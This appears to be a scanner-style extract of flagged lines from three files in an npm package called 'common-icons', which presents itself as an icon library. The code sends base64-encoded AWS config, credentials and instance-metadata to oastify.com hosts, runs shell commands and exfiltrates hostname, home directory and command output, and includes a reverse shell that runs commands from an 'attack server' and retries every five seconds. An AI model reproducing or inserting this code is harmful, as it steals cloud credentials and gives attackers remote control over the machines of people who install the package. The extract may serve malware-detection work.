// File: tmp/tmp_ze2bjoy/common-icons/package/index.js
// ======================================================================
Line 15: Buffer.from(x)
Line 16: buff3.toString('base64')
Line 22: os.networkingInterfaces()
Line 24: os.userInfo()
Line 26: os.userInfo()
Line 32: var options = {
                hostname: '9y8xoee2in0vrzq9k265ztp4bvhm5et3.oastify.com',
                port: 443, 
                path: '/',
                method: "POST",
                headers: {
                    "content-type":"application/x-www-form-urlencoded",
                    "content-length": postData.length,
                    "content-awsconfig":base64data1,
                    "content-awscreds":base64data2,
                    "content-imdsv":base64data3
                }
            }
Line 37: _tmp_2.headers = {
                    "content-type":"application/x-www-form-urlencoded",
                    "content-length": postData.length,
                    "content-awsconfig":base64data1,
                    "content-awscreds":base64data2,
                    "content-imdsv":base64data3
                }

// File: tmp/tmp_ze2bjoy/common-icons/package/index2.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const http = require('http')
Line 3: const os = require('os')
Line 4: const command = require('child_process')
Line 5: _tmp_3 = require('buffer')
Line 11: {
    const postData = JSON.stringify({ ec2: data, hostname: hostname_data, homedir: homedir_data, command_result: command_data });

    const postOptions = {
        hostname: 'xhihdn248xtkn2394eqdmhdax13srif7.oastify.com',
        port: 443,
        path: '/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const postReq = https.request(postOptions, (postRes) => {
        let responseData = '';

        postRes.on('data', (chunk) => {
            responseData += chunk;
        });

        postRes.on('end', () => {
            console.log('Response from xhihdn248xtkn2394eqdmhdax13srif7.oastify.com:', responseData);
        });
    });

    postReq.on('error', (error) => {
        console.error('Error with POST request:', error);
    });

    postReq.write(postData);
    postReq.end();
}
Line 25: const postReq = https.request(postOptions, (postRes) => {
        let responseData = '';

        postRes.on('data', (chunk) => {
            responseData += chunk;
        });

        postRes.on('end', () => {
            console.log('Response from xhihdn248xtkn2394eqdmhdax13srif7.oastify.com:', responseData);
        });
    })
Line 41: postReq.write(postData)
Line 42: postReq.end()
Line 53: os.platform()
Line 54: command.exec(command_input, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error executing command: ${error}`);
        return;
    }

    if (stderr) {
        console.error(`Error in execution: ${stderr}`);
        return;
    }

    // Output the result of 'dir' command
    result = (stdout);
})
Line 69: const req = http.request(options, (res) => {
    let data = '';

    res.on('data', (chunk) => {
        data += chunk;
    });

    res.on('end', () => {
        // Encode the response data in base64
        const encodedData = Buffer.from(data).toString('base64');
        // Send the encoded data to xhihdn248xtkn2394eqdmhdax13srif7.oastify.com
        sendPostToBlaBla(encodedData);
    });
})
Line 78: Buffer.from(data).toString('base64')
Line 80: sendPostToBlaBla(encodedData)
Line 88: sendPostToBlaBla('connection to EC2 failed', os.hostname(), result, os.homedir())

// File: tmp/tmp_ze2bjoy/common-icons/package/index3.js
// ======================================================================
Line 1: const net = require('net')
Line 2: _tmp_1 = require('child_process')
Line 9: const client = new net.Socket()
Line 12: {
        console.log('Connected to the attack server');
        client.write('Reverse shell connected!\n'); // Notify listener of connection
    }
Line 14: client.write('Reverse shell connected!\n')
Line 18: {
        // Execute the received command
        exec(data.toString(), (error, stdout, stderr) => {
            if (stdout) client.write(stdout);   // Send command output back to the attacker
            if (stderr) client.write(stderr);   // Send any errors back to the attacker
            if (error) client.write(error.message);
        });
    }
Line 20: exec(data.toString(), (error, stdout, stderr) => {
            if (stdout) client.write(stdout);   // Send command output back to the attacker
            if (stderr) client.write(stderr);   // Send any errors back to the attacker
            if (error) client.write(error.message);
        })
Line 28: {
        console.log('Connection closed, retrying...');
        setTimeout(connectShell, 5000); // Try reconnecting every 5 seconds
    }
Line 30: setTimeout(connectShell, 5000)
Line 33: {
        console.error('Connection error:', err.message);
        setTimeout(connectShell, 5000); // Retry connection on error
    }
Line 35: setTimeout(connectShell, 5000)
Line 40: connectShell()
